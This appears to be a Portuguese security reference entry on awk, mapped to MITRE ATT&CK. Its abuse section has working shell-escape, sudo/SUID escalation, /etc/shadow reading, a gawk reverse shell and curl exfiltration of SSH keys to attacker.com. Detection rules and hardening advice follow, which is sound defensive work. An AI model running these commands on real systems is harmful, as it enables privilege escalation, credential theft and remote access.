# awk

**Plataforma:** Linux / macOS / Unix

**Categorias:** Execução de código, Shell escape, Leitura de arquivos, Escalada de privilégios (sudo/SUID)

**MITRE ATT&CK:** T1059.004 (Unix Shell), T1548.001 (SUID/SGID), T1005 (Data from Local System)

**Referência ofensiva:** https://gtfobins.org/gtfobins/awk/

---

## O que é o awk

O awk é uma linguagem de programação e processamento de texto orientada a padrão-ação, projetada para processar dados estruturados linha por linha. É uma das ferramentas mais antigas e mais presentes em sistemas Unix — está disponível em toda distribuição Linux, geralmente em múltiplas implementações (gawk, mawk, nawk, busybox awk).

Apesar de ser amplamente visto apenas como uma ferramenta de processamento de texto, o awk é uma linguagem de programação completa: suporta variáveis, loops, condicionais, funções e — o que importa do ponto de vista de segurança — execução de comandos do sistema operacional via a função `system()` e pipes.

---

## Por que atacantes usam o awk

O awk resolve o problema de execução de código em ambientes onde outras ferramentas foram removidas ou bloqueadas. Por ser tão fundamental para o funcionamento de scripts do sistema, raramente é removido ou bloqueado. Em ambientes de container minimalistas ou shells restritos onde bash, python e perl foram eliminados, o awk frequentemente ainda está disponível.

Sua capacidade de executar comandos shell via `system()` o torna equivalente a um interpretador completo para fins de execução de código arbitrário.

---

## Técnicas de abuso

### Execução de shell (escape de ambiente restrito)

```bash
# Executar shell via system()
awk 'BEGIN {system("/bin/bash")}'

# Alternativa com sh
awk 'BEGIN {system("/bin/sh")}'

# Executar comando único
awk 'BEGIN {system("id")}'
awk 'BEGIN {system("whoami")}'

# Executar múltiplos comandos
awk 'BEGIN {system("id; uname -a; cat /etc/passwd")}'
```

### Escalada de privilégios via sudo

```bash
# Se sudoers: user ALL=(ALL) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/bash")}'

# Mais discreto
sudo awk 'BEGIN {system("/bin/sh -p")}'
```

### Abuso de SUID

```bash
# Verificar SUID
find / -name awk -perm -4000 2>/dev/null
find / -name gawk -perm -4000 2>/dev/null

# Com SUID
./awk 'BEGIN {system("/bin/bash -p")}'
```

### Leitura de arquivos

O awk pode ler qualquer arquivo acessível pelo usuário corrente — ou pelo dono do arquivo se executado com SUID:

```bash
# Ler arquivo completo (equivalente ao cat)
awk '{print}' /etc/shadow

# Ler e exibir com número de linha
awk '{print NR": "$0}' /etc/passwd

# Extrair campos específicos (ex: usuário e shell do /etc/passwd)
awk -F: '{print $1, $7}' /etc/passwd

# Ler e filtrar (ex: apenas linhas com root)
awk '/root/' /etc/passwd /etc/shadow

# Com sudo ou SUID, ler arquivo normalmente inacessível
sudo awk '{print}' /etc/shadow
```

### Shell reverso

```bash
# Shell reverso via awk (usando /inet/tcp — suporte disponível no gawk)
awk 'BEGIN {
  s = "/inet/tcp/0/attacker.com/4444";
  while (1) {
    printf "$ " |& s;
    if ((s |& getline c) <= 0) break;
    while (c | getline line) print line |& s;
    close(c);
  }
}'
```

O suporte a `/inet/tcp` é específico do gawk (GNU awk). Não está disponível em mawk ou busybox awk, o que limita essa técnica a sistemas com gawk instalado.

### Exfiltração de dados via pipe

```bash
# Ler arquivo sensível e enviar via curl
awk '{print}' /etc/shadow | curl -X POST -d @- http://attacker.com/collect

# Combinar com base64 para encoding
awk '{print}' /root/.ssh/id_rsa | base64 | curl -X POST -d @- http://attacker.com/collect
```

---

## Técnicas de bypass e evasão

### Uso de implementações alternativas

```bash
# gawk, mawk, nawk — todas suportam system()
gawk 'BEGIN {system("/bin/bash")}'
mawk 'BEGIN {system("/bin/bash")}'
nawk 'BEGIN {system("/bin/bash")}'

# Busybox awk (em sistemas minimalistas)
busybox awk 'BEGIN {system("/bin/bash")}'
```

### Ofuscação via string concatenation

```bash
# O command em system() pode ser construído por concatenação
awk 'BEGIN {cmd="/bin/b"; cmd=cmd"ash"; system(cmd)}'
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- awk com `system()` contendo chamada de shell na linha de comando
- awk executado via sudo
- awk com SUID fora do padrão do sistema
- awk executado por processo filho de servidor web

**Indicadores de média relevância:**

- awk lendo arquivos sensíveis (`/etc/shadow`, `/root/*`) — pode ser legítimo em scripts de admin
- gawk com `/inet/tcp` (tentativa de shell reverso nativo)

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/linux/0101-gtfobins_execution.xml -->

<!-- awk com system() executando shell -->
<rule id="100229" level="13">
  <if_group>auditd</if_group>
  <field name="audit.command" type="pcre2">^[gmnb]?awk$</field>
  <field name="audit.execve" type="pcre2">system\s*\([^)]*(/bin/bash|/bin/sh|python|perl)</field>
  <description>awk com system() executando interpretador — possivel escape de shell restrito ou RCE</description>
  <mitre>
    <id>T1059.004</id>
  </mitre>
</rule>

<!-- awk executado por conta de serviço web -->
<rule id="100230" level="12">
  <if_group>auditd</if_group>
  <field name="audit.command" type="pcre2">^[gmnb]?awk$</field>
  <field name="audit.uid" type="pcre2">^(33|65534|99)$</field>
  <description>awk executado por conta de servico web — contexto suspeito</description>
  <mitre>
    <id>T1059.004</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Processamento de logs e relatórios** — o awk é extremamente comum em scripts de processamento de logs, geração de relatórios e transformação de dados. O uso legítimo raramente inclui `system()` com shells. Concentre alertas na presença de `system()` com argumentos de shell, não no awk em geral.

**Scripts de administração** — scripts de extração de informações do sistema (monitoramento, inventário) frequentemente usam awk. Filtre por usuário e contexto de execução.

---

## Proteção e controles defensivos

**Auditar entradas de sudoers com awk:** `sudo awk` equivale a acesso root completo. Verifique se há entradas no sudoers com awk e remova-as ou substitua por scripts wrapper específicos que fazem apenas a operação necessária.

**Considerar remoção do gawk em servidores minimalistas:** em ambientes de container ou servidores de propósito único, o gawk pode ser removido e substituído por mawk (menor, sem suporte a `/inet/tcp`) ou eliminado completamente se os scripts de sistema não o requererem.

---

## Referências

- GTFOBins — awk: https://gtfobins.org/gtfobins/awk/
- MITRE ATT&CK T1059.004: https://attack.mitre.org/techniques/T1059/004/
- MITRE ATT&CK T1548.001: https://attack.mitre.org/techniques/T1548/001/
